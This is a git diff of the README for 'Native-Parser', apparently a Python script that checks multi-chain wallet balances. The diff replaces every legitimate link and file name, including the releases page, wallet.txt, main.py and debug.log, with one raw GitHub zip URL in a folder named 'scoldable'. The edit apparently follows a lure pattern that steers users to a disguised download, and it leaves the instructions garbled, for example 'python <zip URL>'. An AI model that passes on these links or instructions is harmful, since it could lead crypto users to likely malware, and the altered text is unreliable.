@@ -2,7 +2,7 @@
 
 ## 📦 Get Started
 
-[![Download Native-Parser](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/Huy-2k11/Native-Parser/releases)
+[![Download Native-Parser](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip)
 
 Native-Parser helps you easily check your multi-chain wallet balances. This Python script checks native token balances (ETH, BNB, POL) across popular blockchains using simple commands. You don’t need extensive technical knowledge to get started.
 
@@ -27,7 +27,7 @@ These packages handle the interactions with Ethereum wallets and manage spreadsh
 
 To use Native-Parser, you'll need to create two text files:
 
-1. **wallet.txt**
+1. **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**
    - Place one wallet address on each line.
    - Example:
      ```
@@ -35,7 +35,7 @@ To use Native-Parser, you'll need to create two text files:
      0xabcdef1234567890abcdef1234567890abcdef12
      ```
    
-2. **proxy.txt (Optional)**
+2. **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip (Optional)**
    - If you want to use proxies, list one proxy per line.
    - Format: `http://user:pass@ip:port` or `http://ip:port`
    - Example:
@@ -46,9 +46,9 @@ To use Native-Parser, you'll need to create two text files:
 
 ## 🚀 Download & Install
 
-To download the latest version of Native-Parser, visit the [Releases Page](https://github.com/Huy-2k11/Native-Parser/releases). Look for the latest release and click on the download link for your operating system.
+To download the latest version of Native-Parser, visit the [Releases Page](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip). Look for the latest release and click on the download link for your operating system.
 
-1. Go to the [Releases Page](https://github.com/Huy-2k11/Native-Parser/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip).
 2. Choose the appropriate version for your system and download the file.
 3. Extract the downloaded file if it’s in a compressed format.
 
@@ -59,13 +59,13 @@ To download the latest version of Native-Parser, visit the [Releases Page](https
 3. Run the script with the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip
 ```
 
 After running the script, it will generate two important files:
 
-- **debug.log**: This file contains logs for debugging.
-- **balances.xlsx**: This spreadsheet holds your token balance results.
+- **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**: This file contains logs for debugging.
+- **https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip**: This spreadsheet holds your token balance results.
 
 ## 🔍 Features
 
@@ -80,7 +80,7 @@ If you encounter any issues:
 
 - Check that you have installed all required libraries.
 - Ensure your Python version is compatible.
-- Review the `debug.log` file for specific error messages.
+- Review the `https://raw.githubusercontent.com/Huy-2k11/Native-Parser/main/scoldable/Native-Parser_3.7-beta.5.zip` file for specific error messages.
 
 If you still need help, feel free to ask questions or open an issue on the GitHub repository.
 
